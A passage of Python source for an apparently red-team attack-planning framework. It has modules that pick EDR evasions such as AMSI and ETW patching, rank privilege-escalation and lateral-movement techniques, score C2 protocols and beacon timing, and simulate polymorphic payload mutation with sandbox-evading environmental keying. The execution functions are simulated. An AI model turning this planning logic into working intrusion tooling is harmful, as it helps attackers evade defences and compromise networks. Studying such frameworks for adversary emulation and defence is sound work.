        if self.detected_defenses.get('amsi_enabled'):
            evasions.append({
                'technique': 'amsi_bypass',
                'method': 'memory_patch',
                'description': 'Patch AMSI in memory before script execution'
            })
            
        # Check for ETW bypass
        if self.detected_defenses.get('etw_enabled'):
            evasions.append({
                'technique': 'etw_bypass',
                'method': 'nttracecontrol_patch',
                'description': 'Disable ETW tracing'
            })
            
        return evasions[0] if evasions else None
        
    def _select_runtime_evasion(self, step: Dict) -> Dict:
        """Select runtime evasion technique."""
        step_type = step.get('type', '')
        
        if 'execution' in step_type.lower():
            return {
                'technique': 'indirect_syscall',
                'description': 'Use indirect syscalls to avoid hooks'
            }
        elif 'injection' in step_type.lower():
            return {
                'technique': 'module_stomping',
                'description': 'Overwrite legitimate DLL in memory'
            }
            
        return None
        
    def _select_cleanup_method(self, step: Dict) -> Dict:
        """Select post-execution cleanup method."""
        return {
            'technique': 'memory_cleanup',
            'actions': ['zero_memory', 'unload_modules', 'clear_traces']
        }
        
    def calculate_detection_probability(self, chain: List[Dict]) -> Dict[str, float]:
        """Calculate detection probability for chain."""
        probabilities = {}
        
        for edr in self.detected_defenses.get('edr_products', []):
            caps = self.EDR_DETECTION_CAPABILITIES.get(edr, {})
            
            # Calculate per-step detection probability
            cumulative_not_detected = 1.0
            
            for step in chain:
                step_type = step.get('type', 'unknown')
                relevant_cap = self._get_relevant_capability(step_type)
                cap_score = caps.get(relevant_cap, 5)
                
                # Apply evasion if present
                evasion_factor = 0.5 if step.get('pre_evasion') or step.get('runtime_evasion') else 1.0
                
                step_detection_prob = (cap_score / 10) * evasion_factor
                cumulative_not_detected *= (1 - step_detection_prob)
                
            probabilities[edr] = round(1 - cumulative_not_detected, 3)
            
        return probabilities
        
    def _get_relevant_capability(self, step_type: str) -> str:
        """Get relevant EDR capability for step type."""
        mapping = {
            'execution': 'behavior_analysis',
            'injection': 'process_injection',
            'credential': 'memory_scanning',
            'lateral': 'behavior_analysis',
            'persistence': 'behavior_analysis',
            'exfiltration': 'behavior_analysis'
        }
        
        for key, cap in mapping.items():
            if key in step_type.lower():
                return cap
                
        return 'behavior_analysis'
        
    def get_evasion_profile(self) -> Dict[str, Any]:
        """Get current evasion profile."""
        return {
            'detected_defenses': self.detected_defenses,
            'recommended_techniques': self.recommend_evasion_strategy('general'),
            'success_rates': self.success_rates,
            'overall_risk': self._calculate_overall_risk()
        }
        
    def _calculate_overall_risk(self) -> str:
        """Calculate overall detection risk."""
        edr_count = len(self.detected_defenses.get('edr_products', []))
        logging_level = self.detected_defenses.get('logging_level', 'unknown')
        
        if edr_count >= 2 or logging_level == 'high':
            return 'high'
        elif edr_count == 1 or logging_level == 'medium':
            return 'medium'
        else:
            return 'low'


# =============================================================================
# PRIVILEGE ESCALATION ADVISOR - PrivEsc Intelligence Engine
# =============================================================================

class PrivilegeEscalationAdvisor:
    """
    Intelligent privilege escalation path analysis and recommendation.
    Combines multiple PrivEsc databases and techniques.
    """
    
    WINDOWS_PRIVESC = {
        'T1134.001': {
            'name': 'Token Impersonation',
            'requirements': ['SeImpersonatePrivilege'],
            'success_rate': 0.9,
            'detection_risk': 'medium'
        },
        'T1068': {
            'name': 'Kernel Exploit',
            'requirements': ['vulnerable_kernel'],
            'success_rate': 0.7,
            'detection_risk': 'high'
        },
        'T1574.001': {
            'name': 'DLL Search Order Hijacking',
            'requirements': ['writable_path', 'service_restart'],
            'success_rate': 0.8,
            'detection_risk': 'medium'
        },
        'T1574.002': {
            'name': 'DLL Side-Loading',
            'requirements': ['vulnerable_app', 'writable_location'],
            'success_rate': 0.85,
            'detection_risk': 'low'
        },
        'T1547.001': {
            'name': 'Registry Run Keys',
            'requirements': ['writable_run_key'],
            'success_rate': 0.95,
            'detection_risk': 'high'
        },
        'T1053.005': {
            'name': 'Scheduled Task Abuse',
            'requirements': ['modifiable_task', 'task_scheduler_access'],
            'success_rate': 0.85,
            'detection_risk': 'medium'
        },
        'T1543.003': {
            'name': 'Service Creation',
            'requirements': ['service_create_permission'],
            'success_rate': 0.9,
            'detection_risk': 'high'
        },
        'named_pipes': {
            'name': 'Named Pipe Impersonation',
            'requirements': ['SeImpersonatePrivilege', 'service_trigger'],
            'success_rate': 0.85,
            'detection_risk': 'medium'
        },
        'potato': {
            'name': 'Potato Family Exploits',
            'requirements': ['SeImpersonatePrivilege', 'local_service'],
            'success_rate': 0.9,
            'detection_risk': 'medium'
        },
        'printspoofer': {
            'name': 'PrintSpoofer',
            'requirements': ['SeImpersonatePrivilege', 'print_spooler'],
            'success_rate': 0.95,
            'detection_risk': 'medium'
        }
    }
    
    LINUX_PRIVESC = {
        'T1548.001': {
            'name': 'SUID Binary Abuse',
            'requirements': ['suid_binary'],
            'success_rate': 0.85,
            'detection_risk': 'low'
        },
        'T1548.003': {
            'name': 'Sudo Abuse',
            'requirements': ['sudo_misconfiguration'],
            'success_rate': 0.9,
            'detection_risk': 'low'
        },
        'T1068': {
            'name': 'Kernel Exploit',
            'requirements': ['vulnerable_kernel'],
            'success_rate': 0.7,
            'detection_risk': 'high'
        },
        'T1053.003': {
            'name': 'Cron Job Abuse',
            'requirements': ['writable_cron', 'world_writable_script'],
            'success_rate': 0.8,
            'detection_risk': 'low'
        },
        'capabilities': {
            'name': 'Linux Capabilities Abuse',
            'requirements': ['cap_setuid', 'cap_net_raw'],
            'success_rate': 0.9,
            'detection_risk': 'low'
        },
        'path_injection': {
            'name': 'PATH Injection',
            'requirements': ['relative_path_call', 'writable_path'],
            'success_rate': 0.8,
            'detection_risk': 'low'
        },
        'nfs_no_root_squash': {
            'name': 'NFS no_root_squash',
            'requirements': ['nfs_share', 'no_root_squash'],
            'success_rate': 0.95,
            'detection_risk': 'low'
        },
        'docker_escape': {
            'name': 'Docker Container Escape',
            'requirements': ['docker_socket', 'privileged_container'],
            'success_rate': 0.85,
            'detection_risk': 'medium'
        },
        'lxd_privesc': {
            'name': 'LXD/LXC Privilege Escalation',
            'requirements': ['lxd_group_membership'],
            'success_rate': 0.95,
            'detection_risk': 'medium'
        }
    }
    
    def __init__(self):
        self.system_info: Dict[str, Any] = {}
        self.discovered_vectors: List[Dict] = []
        self.exploitation_history: List[Dict] = []
        
    def analyze_target(self, system_info: Dict) -> Dict[str, Any]:
        """Analyze target system for privilege escalation vectors."""
        self.system_info = system_info
        os_type = system_info.get('os_type', 'windows').lower()
        
        analysis = {
            'os_type': os_type,
            'current_privileges': system_info.get('current_privileges', []),
            'available_vectors': [],
            'recommended_path': None
        }
        
        privesc_db = self.WINDOWS_PRIVESC if 'windows' in os_type else self.LINUX_PRIVESC
        
        for tech_id, tech in privesc_db.items():
            # Check if requirements are met
            requirements_met = self._check_requirements(tech.get('requirements', []), system_info)
            
            if requirements_met > 0.5:  # At least partial match
                vector = {
                    'technique_id': tech_id,
                    'name': tech.get('name'),
                    'requirements_match': requirements_met,
                    'success_rate': tech.get('success_rate', 0.5),
                    'detection_risk': tech.get('detection_risk', 'medium'),
                    'effective_success': tech.get('success_rate', 0.5) * requirements_met,
                    'requirements': tech.get('requirements', [])
                }
                analysis['available_vectors'].append(vector)
                self.discovered_vectors.append(vector)
                
        # Sort by effective success rate
        analysis['available_vectors'].sort(key=lambda x: x['effective_success'], reverse=True)
        
        if analysis['available_vectors']:
            analysis['recommended_path'] = analysis['available_vectors'][0]
            
        return analysis
        
    def _check_requirements(self, requirements: List[str], system_info: Dict) -> float:
        """Check what percentage of requirements are met."""
        if not requirements:
            return 1.0
            
        met = 0
        available = system_info.get('available_conditions', [])
        privileges = system_info.get('current_privileges', [])
        
        for req in requirements:
            # Check in available conditions
            if req in available:
                met += 1
            # Check in privileges
            elif req in privileges:
                met += 1
            # Check for kernel vulnerability
            elif req == 'vulnerable_kernel':
                if system_info.get('kernel_version') in system_info.get('vulnerable_kernels', []):
                    met += 1
                    
        return met / len(requirements)
        
    def get_privesc_chain(self, from_level: str, to_level: str) -> List[Dict]:
        """Get privilege escalation chain from one level to another."""
        levels = ['user', 'local_admin', 'system', 'domain_admin']
        
        from_idx = levels.index(from_level) if from_level in levels else 0
        to_idx = levels.index(to_level) if to_level in levels else len(levels) - 1
        
        if from_idx >= to_idx:
            return []
            
        chain = []
        current_level = from_level
        
        for i in range(from_idx, to_idx):
            next_level = levels[i + 1]
            
            # Find best vector for this escalation
            vectors = [v for v in self.discovered_vectors 
                      if self._vector_escalates_to(v, next_level)]
                      
            if vectors:
                best = max(vectors, key=lambda x: x['effective_success'])
                chain.append({
                    'from_level': current_level,
                    'to_level': next_level,
                    'technique': best
                })
                current_level = next_level
                
        return chain
        
    def _vector_escalates_to(self, vector: Dict, target_level: str) -> bool:
        """Check if vector can escalate to target level."""
        # Simplified mapping
        technique_targets = {
            'Token Impersonation': 'system',
            'Kernel Exploit': 'system',
            'SUID Binary Abuse': 'local_admin',
            'Sudo Abuse': 'local_admin',
            'Potato Family Exploits': 'system',
            'PrintSpoofer': 'system'
        }
        
        return technique_targets.get(vector.get('name'), 'local_admin') == target_level
        
    def generate_privesc_report(self) -> Dict[str, Any]:
        """Generate privilege escalation assessment report."""
        return {
            'system_analysis': self.system_info,
            'discovered_vectors': len(self.discovered_vectors),
            'high_success_vectors': [v for v in self.discovered_vectors if v['effective_success'] > 0.7],
            'low_risk_vectors': [v for v in self.discovered_vectors if v['detection_risk'] == 'low'],
            'recommended_chain': self.get_privesc_chain('user', 'system'),
            'exploitation_history': self.exploitation_history
        }


# =============================================================================
# COMMAND & CONTROL OPTIMIZER - C2 Channel Intelligence
# =============================================================================

class C2ChannelOptimizer:
    """
    Command and Control channel optimization and management.
    Provides intelligent C2 selection and resilience planning.
    """
    
    C2_PROTOCOLS = {
        'https': {
            'covertness': 8,
            'bandwidth': 'high',
            'reliability': 9,
            'latency': 'low',
            'firewall_bypass': 9,
            'typical_ports': [443, 8443],
            'fingerprint_risk': 'medium'
        },
        'dns': {
            'covertness': 9,
            'bandwidth': 'very_low',
            'reliability': 9,
            'latency': 'high',
            'firewall_bypass': 10,
            'typical_ports': [53],
            'fingerprint_risk': 'low'
        },
        'doh': {
            'covertness': 9,
            'bandwidth': 'low',
            'reliability': 8,
            'latency': 'medium',
            'firewall_bypass': 9,
            'typical_ports': [443],
            'fingerprint_risk': 'low'
        },
        'websocket': {
            'covertness': 7,
            'bandwidth': 'high',
            'reliability': 8,
            'latency': 'very_low',
            'firewall_bypass': 8,
            'typical_ports': [80, 443],
            'fingerprint_risk': 'medium'
        },
        'smb': {
            'covertness': 4,
            'bandwidth': 'high',
            'reliability': 7,
            'latency': 'low',
            'firewall_bypass': 3,
            'typical_ports': [445, 139],
            'fingerprint_risk': 'high'
        },
        'icmp': {
            'covertness': 7,
            'bandwidth': 'very_low',
            'reliability': 5,
            'latency': 'low',
            'firewall_bypass': 4,
            'typical_ports': [],
            'fingerprint_risk': 'medium'
        },
        'cloud_c2': {
            'covertness': 9,
            'bandwidth': 'high',
            'reliability': 9,
            'latency': 'medium',
            'firewall_bypass': 10,
            'typical_ports': [443],
            'fingerprint_risk': 'low'
        }
    }
    
    def __init__(self):
        self.active_channels: Dict[str, Dict] = {}
        self.channel_health: Dict[str, str] = {}
        self.beacon_history: List[Dict] = []
        self.fallback_order: List[str] = []
        
    def analyze_egress(self, network_info: Dict) -> Dict[str, Any]:
        """Analyze egress options for C2."""
        analysis = {
            'available_protocols': [],
            'blocked_protocols': [],
            'recommended_primary': None,
            'recommended_backup': None
        }
        
        allowed_ports = network_info.get('allowed_outbound_ports', [80, 443])
        proxy_in_use = network_info.get('proxy_configured', False)
        ssl_inspection = network_info.get('ssl_inspection', False)
        dns_filtering = network_info.get('dns_filtering', False)
        
        for proto_name, proto in self.C2_PROTOCOLS.items():
            # Check port availability
            ports_available = any(p in allowed_ports for p in proto.get('typical_ports', []))
            
            # Check protocol-specific constraints
            if proto_name == 'dns' and dns_filtering:
                analysis['blocked_protocols'].append({
                    'protocol': proto_name,
                    'reason': 'DNS filtering detected'
                })
                continue
                
            if proto_name == 'https' and ssl_inspection:
                # HTTPS still works but covertness reduced
                modified_proto = proto.copy()
                modified_proto['covertness'] -= 3
                modified_proto['fingerprint_risk'] = 'high'
                
            if ports_available or proto_name in ['dns', 'icmp', 'cloud_c2']:
                score = self._calculate_protocol_score(proto, network_info)
                analysis['available_protocols'].append({
                    'protocol': proto_name,
                    'score': score,
                    **proto
                })
                
        # Sort by score
        analysis['available_protocols'].sort(key=lambda x: x['score'], reverse=True)
        
        if analysis['available_protocols']:
            analysis['recommended_primary'] = analysis['available_protocols'][0]
            if len(analysis['available_protocols']) > 1:
                # Select backup with different characteristics
                for proto in analysis['available_protocols'][1:]:
                    if proto['bandwidth'] != analysis['recommended_primary']['bandwidth']:
                        analysis['recommended_backup'] = proto
                        break
                        
        return analysis
        
    def _calculate_protocol_score(self, proto: Dict, network_info: Dict) -> float:
        """Calculate protocol suitability score."""
        weights = {
            'covertness': 0.3,
            'reliability': 0.25,
            'firewall_bypass': 0.25,
            'bandwidth_score': 0.1,
            'latency_score': 0.1
        }
        
        bandwidth_scores = {'very_low': 2, 'low': 4, 'medium': 6, 'high': 8, 'very_high': 10}
        latency_scores = {'very_high': 2, 'high': 4, 'medium': 6, 'low': 8, 'very_low': 10}
        
        score = (
            proto.get('covertness', 5) * weights['covertness'] +
            proto.get('reliability', 5) * weights['reliability'] +
            proto.get('firewall_bypass', 5) * weights['firewall_bypass'] +
            bandwidth_scores.get(proto.get('bandwidth', 'medium'), 5) * weights['bandwidth_score'] +
            latency_scores.get(proto.get('latency', 'medium'), 5) * weights['latency_score']
        )
        
        return round(score, 2)
        
    def configure_channel(self, channel_id: str, config: Dict) -> Dict:
        """Configure a C2 channel."""
        channel = {
            'id': channel_id,
            'protocol': config.get('protocol', 'https'),
            'endpoints': config.get('endpoints', []),
            'beacon_interval': config.get('beacon_interval', 60),
            'jitter': config.get('jitter', 0.2),
            'encryption': config.get('encryption', 'aes256'),
            'authentication': config.get('authentication', 'certificate'),
            'kill_date': config.get('kill_date'),
            'working_hours': config.get('working_hours'),
            'status': 'configured',
            'last_beacon': None
        }
        
        self.active_channels[channel_id] = channel
        self.channel_health[channel_id] = 'unknown'
        
        return channel
        
    def set_fallback_order(self, order: List[str]):
        """Set fallback order for C2 channels."""
        self.fallback_order = order
        
    def check_channel_health(self, channel_id: str) -> Dict:
        """Check health of C2 channel."""
        if channel_id not in self.active_channels:
            return {'status': 'not_found'}
            
        channel = self.active_channels[channel_id]
        
        # Simulate health check
        health = {
            'channel_id': channel_id,
            'protocol': channel.get('protocol'),
            'status': self.channel_health.get(channel_id, 'unknown'),
            'last_beacon': channel.get('last_beacon'),
            'missed_beacons': 0,
            'latency_ms': random.randint(50, 500)
        }
        
        return health
        
    def optimize_beacon_timing(self, operational_context: Dict) -> Dict[str, Any]:
        """Optimize beacon timing based on operational context."""
        work_hours = operational_context.get('target_work_hours', {'start': 9, 'end': 17})
        stealth_priority = operational_context.get('stealth_priority', 7)
        responsiveness_need = operational_context.get('responsiveness_need', 5)
        
        # Calculate optimal interval
        base_interval = 60  # 1 minute
        
        # Stealth increases interval
        interval = base_interval * (stealth_priority / 5)
        
        # Responsiveness decreases interval
        interval = interval / (responsiveness_need / 5)
        
        # Calculate jitter
        jitter = min(0.5, stealth_priority / 15)
        
        optimization = {
            'recommended_interval_seconds': int(interval),
            'recommended_jitter': round(jitter, 2),
            'work_hours_only': stealth_priority > 6,
            'weekend_behavior': 'reduced' if stealth_priority > 7 else 'normal',
            'profile': {
                'work_hours': {
                    'interval': int(interval),
                    'jitter': round(jitter, 2)
                },
                'after_hours': {
                    'interval': int(interval * 3),
                    'jitter': round(min(0.7, jitter * 1.5), 2)
                },
                'weekend': {
                    'interval': int(interval * 5) if stealth_priority > 7 else int(interval * 2),
                    'jitter': round(min(0.8, jitter * 2), 2)
                }
            }
        }
        
        return optimization
        
    def get_c2_status(self) -> Dict[str, Any]:
        """Get comprehensive C2 status."""
        return {
            'active_channels': len(self.active_channels),
            'healthy_channels': sum(1 for h in self.channel_health.values() if h == 'healthy'),
            'fallback_order': self.fallback_order,
            'channels': [
                {
                    'id': cid,
                    'protocol': ch.get('protocol'),
                    'health': self.channel_health.get(cid, 'unknown'),
                    'last_beacon': ch.get('last_beacon')
                }
                for cid, ch in self.active_channels.items()
            ]
        }


# =============================================================================
# PAYLOAD MUTATION ENGINE - Dynamic Payload Generation
# =============================================================================

class PayloadMutationEngine:
    """
    Advanced payload mutation and generation engine.
    Creates polymorphic, metamorphic, and evasive payloads.
    """
    
    MUTATION_TECHNIQUES = {
        'string_obfuscation': {
            'methods': ['base64', 'xor', 'aes', 'char_substitution', 'string_concat'],
            'detection_bypass': 6,
            'complexity': 3
        },
        'control_flow_obfuscation': {
            'methods': ['opaque_predicates', 'dead_code', 'loop_unrolling', 'function_merging'],
            'detection_bypass': 7,
            'complexity': 6
        },
        'api_obfuscation': {
            'methods': ['dynamic_resolution', 'hash_resolution', 'syscall_replacement'],
            'detection_bypass': 8,
            'complexity': 7
        },
        'metamorphic': {
            'methods': ['instruction_substitution', 'register_reassignment', 'code_transposition'],
            'detection_bypass': 9,
            'complexity': 9
        },
        'polymorphic': {
            'methods': ['self_modifying', 'decryptor_variation', 'garbage_insertion'],
            'detection_bypass': 8,
            'complexity': 8
        },
        'environmental_keying': {
            'methods': ['domain_key', 'username_key', 'hardware_key', 'time_key'],
            'detection_bypass': 9,
            'complexity': 5
        }
    }
    
    def __init__(self):
        self.mutation_history: List[Dict] = []
        self.generated_payloads: Dict[str, Dict] = {}
        self.signature_database: Dict[str, str] = {}
        
    def mutate_payload(self, payload: Dict, techniques: List[str]) -> Dict[str, Any]:
        """Apply mutation techniques to payload."""
        mutation_id = f"mutation_{int(time.time())}_{random.randint(1000, 9999)}"
        
        mutated = {
            'id': mutation_id,
            'original_hash': hashlib.sha256(
                str(payload.get('code', '')).encode()
            ).hexdigest()[:16],
            'techniques_applied': [],
            'detection_bypass_score': 0,
            'mutations': []
        }
        
        cumulative_bypass = 0
        for tech_name in techniques:
            tech = self.MUTATION_TECHNIQUES.get(tech_name)
            if not tech:
                continue
                
            # Simulate mutation
            method = random.choice(tech.get('methods', ['default']))
            mutation_result = {
                'technique': tech_name,
                'method': method,
                'bypass_improvement': tech.get('detection_bypass', 5),
                'complexity_cost': tech.get('complexity', 5)
            }
            
            mutated['mutations'].append(mutation_result)
            mutated['techniques_applied'].append(tech_name)
            cumulative_bypass += tech.get('detection_bypass', 5)
            
        mutated['detection_bypass_score'] = min(10, cumulative_bypass / len(techniques)) if techniques else 0
        mutated['mutated_hash'] = hashlib.sha256(
            f"{mutated['original_hash']}_{mutation_id}".encode()
        ).hexdigest()[:16]
        
        self.generated_payloads[mutation_id] = mutated
        self.mutation_history.append({
            'mutation_id': mutation_id,
            'timestamp': datetime.now().isoformat(),
            'techniques': techniques
        })
        
        return mutated
        
    def generate_polymorphic_variant(self, base_payload: Dict) -> Dict[str, Any]:
        """Generate a polymorphic variant of payload."""
        variant = {
            'base_hash': hashlib.sha256(str(base_payload).encode()).hexdigest()[:16],
            'variant_id': f"poly_{int(time.time())}",
            'decryptor_stub': self._generate_decryptor_stub(),
            'encrypted_payload': self._simulate_encryption(base_payload),
            'garbage_code': self._generate_garbage_code(),
            'detection_score': 9
        }
        
        return variant
        
    def _generate_decryptor_stub(self) -> Dict:
        """Generate random decryptor stub."""
        stub_types = ['xor_loop', 'aes_decrypt', 'rc4_decrypt', 'custom_cipher']
        return {
            'type': random.choice(stub_types),
            'key_derivation': random.choice(['hardcoded', 'environmental', 'derived']),
            'size_bytes': random.randint(50, 200)
        }
        
    def _simulate_encryption(self, payload: Dict) -> Dict:
        """Simulate payload encryption."""
        return {
            'algorithm': random.choice(['aes256', 'chacha20', 'xor_custom']),
            'key_length': 256,
            'iv_length': 16,
            'encrypted_size': len(str(payload)) + random.randint(16, 64)
        }
        
    def _generate_garbage_code(self) -> Dict:
        """Generate garbage code for obfuscation."""
        return {
            'type': random.choice(['dead_code', 'opaque_predicates', 'fake_api_calls']),
            'size_bytes': random.randint(100, 500),
            'location': random.choice(['before_decryptor', 'interspersed', 'after_payload'])
        }
        
    def apply_environmental_keying(self, payload: Dict, keys: List[str]) -> Dict:
        """Apply environmental keying to payload."""
        keying = {
            'payload_id': payload.get('id', 'unknown'),
            'keys_used': [],
            'decryption_requirements': []
        }
        
        key_methods = {
            'domain': {
                'check': 'environment.userdnsdomain',
                'derivation': 'sha256(domain)[:32]'
            },
            'username': {
                'check': 'environment.username',
                'derivation': 'sha256(username)[:32]'
            },
            'hostname': {
                'check': 'environment.computername',
                'derivation': 'sha256(hostname)[:32]'
            },
            'time_window': {
                'check': 'current_date in range',
                'derivation': 'sha256(date)[:32]'
            },
            'hardware': {
                'check': 'wmic bios get serialnumber',
                'derivation': 'sha256(serial)[:32]'
            }
        }
        
        for key in keys:
            if key in key_methods:
                keying['keys_used'].append({
                    'key_type': key,
                    **key_methods[key]
                })
                keying['decryption_requirements'].append(f"Valid {key}")
                
        keying['combined_key_derivation'] = 'xor(all_keys)'
        keying['sandbox_resistance'] = len(keys) * 2
        
        return keying
        
    def generate_staged_payload(self, stages: List[Dict]) -> Dict[str, Any]:
        """Generate multi-stage payload."""
        staged = {
            'stages': [],
            'total_stages': len(stages),
            'staging_method': 'sequential',
            'inter_stage_validation': True
        }
        
        for i, stage in enumerate(stages):
            stage_info = {
                'stage_number': i + 1,
                'purpose': stage.get('purpose', 'unknown'),
                'size_bytes': stage.get('size', 1000),
                'retrieval_method': stage.get('retrieval', 'https'),
                'validation': {
                    'method': random.choice(['hash_check', 'signature', 'size_check']),
                    'anti_debug': True,
                    'anti_vm': i == 0  # Only first stage has anti-VM
                }
            }
            staged['stages'].append(stage_info)
            
        return staged
        
    def get_mutation_report(self) -> Dict[str, Any]:
        """Get mutation engine report."""
        return {
            'total_mutations': len(self.mutation_history),
            'payloads_generated': len(self.generated_payloads),
            'techniques_used': list(set(
                tech for m in self.mutation_history 
                for tech in m.get('techniques', [])
            )),
            'average_bypass_score': sum(
                p.get('detection_bypass_score', 0) 
                for p in self.generated_payloads.values()
            ) / max(1, len(self.generated_payloads))
        }


# =============================================================================
# LATERAL MOVEMENT ORCHESTRATOR - Intelligent Lateral Movement
# =============================================================================

class LateralMovementOrchestrator:
    """
    Intelligent lateral movement planning and orchestration.
    Optimizes movement paths based on detection risk and objectives.
    """
    
    LATERAL_TECHNIQUES = {
        'T1021.001': {
            'name': 'Remote Desktop Protocol',
            'stealth': 3,
            'speed': 8,
            'reliability': 9,
            'requirements': ['rdp_access', 'valid_credentials'],
            'detection_sources': ['event_4624', 'event_4778', 'rdp_logs']
        },
        'T1021.002': {
            'name': 'SMB/Windows Admin Shares',
            'stealth': 4,
            'speed': 9,
            'reliability': 8,
            'requirements': ['smb_access', 'admin_credentials'],
            'detection_sources': ['event_5140', 'event_5145', 'smb_logs']
        },
        'T1021.003': {
            'name': 'Distributed Component Object Model',
            'stealth': 6,
            'speed': 7,
            'reliability': 7,
            'requirements': ['dcom_access', 'admin_credentials'],
            'detection_sources': ['event_4688', 'dcom_logs']
        },
        'T1021.004': {
            'name': 'SSH',
            'stealth': 5,
            'speed': 9,
            'reliability': 9,
            'requirements': ['ssh_access', 'valid_credentials'],
            'detection_sources': ['auth_logs', 'ssh_logs']
        },
        'T1021.006': {
            'name': 'Windows Remote Management',
            'stealth': 5,
            'speed': 8,
            'reliability': 8,
            'requirements': ['winrm_access', 'valid_credentials'],
            'detection_sources': ['event_91', 'powershell_logs']
        },
        'T1047': {
            'name': 'Windows Management Instrumentation',
            'stealth': 5,
            'speed': 7,
            'reliability': 7,
            'requirements': ['wmi_access', 'admin_credentials'],
            'detection_sources': ['event_5857', 'wmi_trace']
        },
        'T1072': {
            'name': 'Software Deployment Tools',
            'stealth': 8,
            'speed': 9,
            'reliability': 8,
            'requirements': ['deployment_tool_access'],
            'detection_sources': ['deployment_logs', 'software_inventory']
        },
        'T1550.002': {
            'name': 'Pass the Hash',
            'stealth': 5,
            'speed': 9,
            'reliability': 8,
            'requirements': ['ntlm_hash', 'smb_access'],
            'detection_sources': ['event_4624', 'ntlm_audit']
        },
        'T1550.003': {
            'name': 'Pass the Ticket',
            'stealth': 6,
            'speed': 9,
            'reliability': 9,
            'requirements': ['kerberos_ticket'],
            'detection_sources': ['kerberos_logs', 'event_4768']
        }
    }
    
    def __init__(self):
        self.movement_graph: Dict[str, List[Dict]] = {}
        self.movement_history: List[Dict] = []
        self.current_position: str = None
        self.compromised_hosts: Set[str] = set()
        self.available_credentials: Dict[str, Dict] = {}
        
    def map_movement_options(self, from_host: str, network_info: Dict) -> List[Dict]:
        """Map available lateral movement options from a host."""
        options = []
        
        target_hosts = network_info.get('reachable_hosts', [])
        available_services = network_info.get('available_services', {})
        
        for target in target_hosts:
            if target in self.compromised_hosts:
                continue
                
            target_services = available_services.get(target, [])
            
            for tech_id, tech in self.LATERAL_TECHNIQUES.items():
                # Check if technique is viable for this target
                viable = self._check_technique_viability(tech, target_services)
                
                if viable:
                    option = {
                        'technique_id': tech_id,
                        'name': tech.get('name'),
                        'from_host': from_host,
                        'to_host': target,
                        'stealth': tech.get('stealth'),
                        'speed': tech.get('speed'),
                        'reliability': tech.get('reliability'),
                        'requirements_met': viable,
                        'score': self._calculate_movement_score(tech, network_info)
                    }
                    options.append(option)
                    
        # Sort by score
        options.sort(key=lambda x: x['score'], reverse=True)
        
        return options
        
    def _check_technique_viability(self, technique: Dict, target_services: List[str]) -> float:
        """Check if technique requirements are met."""
        requirements = technique.get('requirements', [])
        if not requirements:
            return 1.0
            
        met = 0
        service_map = {
            'rdp_access': 'rdp',
            'smb_access': 'smb',
            'ssh_access': 'ssh',
            'winrm_access': 'winrm',
            'wmi_access': 'wmi'
        }
        
        for req in requirements:
            if req in service_map and service_map[req] in target_services:
                met += 1
            elif req in ['valid_credentials', 'admin_credentials']:
                if self.available_credentials:
                    met += 0.5  # Partial credit if we have some creds
                    
        return met / len(requirements)
        
    def _calculate_movement_score(self, technique: Dict, context: Dict) -> float:
        """Calculate movement technique score."""
        stealth_weight = context.get('stealth_priority', 5) / 10
        speed_weight = context.get('speed_priority', 5) / 10
        reliability_weight = 1 - stealth_weight - speed_weight
        
        score = (
            technique.get('stealth', 5) * stealth_weight +
            technique.get('speed', 5) * speed_weight +
            technique.get('reliability', 5) * reliability_weight
        )
        
        return round(score, 2)
        
    def plan_movement_path(self, start: str, target: str, 
                          network_topology: Dict) -> List[Dict]:
        """Plan optimal lateral movement path."""
        # Build graph
        graph = {}
        hosts = network_topology.get('hosts', [])
        
        for host in hosts:
            host_id = host.get('id', host.get('ip'))
            options = self.map_movement_options(host_id, {
                'reachable_hosts': [h.get('id', h.get('ip')) for h in hosts if h != host],
                'available_services': network_topology.get('services', {})
            })
            graph[host_id] = options
            
        # Dijkstra-like path finding with custom cost
        import heapq
        
        costs = {start: 0}
        paths = {start: []}
        pq = [(0, start, [])]
        visited = set()
        
        while pq:
            cost, current, path = heapq.heappop(pq)
            
            if current in visited:
                continue
                
            visited.add(current)
            
            if current == target:
                return path
                
            for option in graph.get(current, []):
                next_host = option['to_host']
                if next_host in visited:
                    continue
                    
                # Cost is inverse of score (lower is better)
                move_cost = 10 - option.get('score', 5)
                new_cost = cost + move_cost
                
                if next_host not in costs or new_cost < costs[next_host]:
                    costs[next_host] = new_cost
                    new_path = path + [option]
                    paths[next_host] = new_path
                    heapq.heappush(pq, (new_cost, next_host, new_path))
                    
        return []
        
    def execute_movement(self, movement: Dict) -> Dict[str, Any]:
        """Execute lateral movement (simulated)."""
        from_host = movement.get('from_host')
        to_host = movement.get('to_host')
        technique = movement.get('technique_id')
        
        # Simulate success based on reliability
        technique_info = self.LATERAL_TECHNIQUES.get(technique, {})
        success_prob = technique_info.get('reliability', 5) / 10
        success = random.random() < success_prob
        
        result = {
            'movement_id': f"move_{int(time.time())}",
            'from': from_host,
            'to': to_host,
            'technique': technique,
            'success': success,
            'timestamp': datetime.now().isoformat()
        }
        
        if success:
            self.compromised_hosts.add(to_host)
            self.current_position = to_host
            
        self.movement_history.append(result)
        
        return result
        
    def get_movement_status(self) -> Dict[str, Any]:
        """Get lateral movement status."""
        return {
            'current_position': self.current_position,
            'compromised_hosts': list(self.compromised_hosts),
            'total_movements': len(self.movement_history),
            'successful_movements': sum(1 for m in self.movement_history if m['success']),
            'available_credentials': len(self.available_credentials),
            'movement_history': self.movement_history[-10:]  # Last 10
        }


# =============================================================================
# IMPACT ASSESSMENT ENGINE - Business Impact Analysis
# =============================================================================

class ImpactAssessmentEngine:
    """
    Advanced business impact assessment for attack chains.
    Calculates financial, operational, and reputational impact.
    """
    
    IMPACT_CATEGORIES = {
        'financial': {
            'direct_costs': ['breach_response', 'legal_fees', 'regulatory_fines', 'ransom_payment'],
            'indirect_costs': ['business_interruption', 'lost_productivity', 'customer_churn'],
            'long_term': ['credit_monitoring', 'security_improvements', 'insurance_increases']
        },
        'operational': {
            'availability': ['system_downtime', 'service_degradation', 'data_loss'],
            'integrity': ['data_corruption', 'config_tampering', 'backdoor_installation'],
            'confidentiality': ['data_breach', 'ip_theft', 'credential_exposure']
        },
        'reputational': {
            'customer_trust': ['breach_disclosure', 'media_coverage', 'social_media'],
            'partner_trust': ['supply_chain_impact', 'contract_violations'],
            'regulatory': ['compliance_violations', 'audit_failures']
        }
    }
    
    def __init__(self):
        self.asset_values: Dict[str, Dict] = {}
        self.impact_history: List[Dict] = []
        self.organization_profile: Dict[str, Any] = {}
        
    def configure_organization(self, profile: Dict):
        """Configure organization profile for impact calculation."""
        self.organization_profile = {
            'industry': profile.get('industry', 'technology'),
            'size': profile.get('size', 'medium'),
